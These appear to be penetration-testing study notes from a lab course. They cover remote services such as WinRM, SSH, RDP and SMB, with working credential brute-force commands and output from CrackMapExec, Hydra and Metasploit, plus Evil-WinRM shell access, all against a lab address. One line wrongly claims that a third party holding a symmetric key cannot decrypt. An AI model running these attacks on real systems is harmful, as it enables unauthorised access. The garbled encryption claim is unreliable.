Apart from web applications, these services include (but are not limited to):

for more see [[Footprinting]]

|FTP|SMB|NFS|
|IMAP/POP3|SSH|MySQL/MSSQL|
|RDP|WinRM|VNC|
|Telnet|SMTP|LDAP|

Imagine that we want to manage a Windows server over the network. We need a service that allows us to access the system, execute commands on it, or access its contents via a GUI or the terminal.  the most common services suitable for this are `RDP`, `WinRM`, and `SSH`. SSH is now much less common on Windows, but it is the leading service for Linux-based systems.

but they are configured with default settings in many cases.

## WinRM 
* [Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) is the Microsoft implementation of the network protocol [Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`).
* It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems.
* It takes care of the communication between [Web-Based Enterprise Management](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) and the [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), which can call the [Distributed Component Object Model](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).
 for security reasons, WinRM must be activated and configured manually in Windows 10. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM.
* In most cases, one uses certificates or only specific authentication mechanisms to increase its security. WinRM uses the TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`).
	*A handy tool that we can use for our password attacks is *[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others

## CrackMapExec
 
Note that we can specify a specific protocol and receive a more detailed help menu of all of the options available to us.

```shell-session
canklesmaks@htb[/htb]$ crackmapexec smb -h
```

#### CrackMapExec Usage

The general format for using CrackMapExec is as follows: 

```shell-session
canklesmaks@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
```shell-session
canklesmaks@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
``````

* The appearance of `(Pwn3d!)` is the sign that we can most likely execute system commands if we log in with the brute-forced user.
*  Another hevilandy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.*
## Evil-WinRM

#### Evil-WinRM Usage

```shell-session
canklesmaks@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>



canklesmaks@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

* If the login was successful, a terminal session is initialized using the [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`), which simplifies the operation and execution of commands.

## SSH 
* * [Secure Shell](https://www.ssh.com/academy/ssh/protocol) (`SSH`) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on `TCP port 22` by default, to which we can connect using an SSH client. 
* This service uses three different cryptography operations/methods: `symmetric` encryption, `asymmetric` encryption, and `hashing`.

### Symmetric encryption 
* Symmetric encryption uses the `same key` for encryption and decryption.
* Anyone who has access to the key could also access the transmitted data. Therefore, a key exchange procedure is needed for secure symmetric encryption.
	* see The [Diffie-Hellman](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) Key exchange method.
* **If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown.
	* *However*, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.

## Asymmetrical Encryption
* Asymmetric encryption uses `two SSH keys`: a private key and a public key.
* The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key.
	* *If an attacker obtains the private key, which is often not password protected, he **will** be able to log in to the system without credentials.
* Once a connection is established, the server uses the public key for initialization and authentication.
	*  If the client can decrypt the message, it has the private key, and the SSH session can begin.

## Hashing
* The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

## Hydra - SSH
* We can use a tool such as Hydra to brute force SSH
```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197
```

## ## Remote Desktop Protocol (RDP)
* The Remote Desktop Protocol defines two participants for a connection: 
	* a so-called terminal server, on which the actual work takes place, 
	* and a terminal client, via which the terminal server is remotely controlled.
	* ** also used in some third-party solutions**

## Hydra - RDP
* We can also use `Hydra` to perform RDP bruteforcing.
```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```
## SMB 
* SMB can be compared to `NFS` for Unix and Linux for providing drives on local networks.
* SMB is also known as [Common Internet File System](https://cifs.com/) (`CIFS`). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS.
## Hydra - SMB
```shell-session
 hydra -L user.list -P password.list smb://10.129.42.197
```
## Metasploit Framework
 ```shell-session
canklesmaks@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


Now we can use `CrackMapExec` again to view the available shares and what privileges we have for them.
## CrackMapExec
```shell-session
canklesmaks@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```
To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html).
```shell-session
canklesmaks@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
```
